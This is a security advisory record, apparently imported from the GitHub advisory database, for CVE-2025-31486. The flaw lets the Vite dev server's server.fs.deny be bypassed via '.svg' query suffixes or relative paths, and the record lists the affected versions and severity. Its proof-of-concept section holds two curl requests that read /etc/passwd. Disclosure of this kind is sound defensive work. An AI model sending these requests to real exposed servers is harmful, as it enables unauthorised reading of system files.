advisory_id: GHSA-xcj6-pq6g-qj4x
datasource_id: github_osv_importer_v2/GHSA-xcj6-pq6g-qj4x
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-xcj6-pq6g-qj4x/GHSA-xcj6-pq6g-qj4x.json
aliases:
  - CVE-2025-31486
summary: |
  Vite allows server.fs.deny to be bypassed with .svg or relative paths
  ### Summary

  The contents of arbitrary files can be returned to the browser.

  ### Impact

  Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

  ### Details

  #### `.svg`

  Requests ending with `.svg` are loaded at this line.
  https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
  By adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.

  This bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.

  #### relative paths

  The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).

  ### PoC

  ```bash
  npm create vite@latest
  cd vite-project/
  npm install
  npm run dev
  ```

  send request to read `etc/passwd`

  ```bash
  curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
  ```

  ```bash
  curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'
  ```
impacted_packages:
  - purl: pkg:npm/vite
    affected_versions: vers:npm/>=6.2.0|<6.2.5
    fixed_versions: vers:npm/6.2.5
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/>=6.1.0|<6.1.4
    fixed_versions: vers:npm/6.1.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/>=6.0.0|<6.0.14
    fixed_versions: vers:npm/6.0.14
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/>=5.0.0|<5.4.17
    fixed_versions: vers:npm/5.4.17
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<4.5.12
    fixed_versions: vers:npm/4.5.12
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-xcj6-pq6g-qj4x/GHSA-xcj6-pq6g-qj4x.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-200
  - CWE-284
references:
  - url: https://github.com/vitejs/vite
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-31486
    reference_type:
    reference_id: CVE-2025-31486
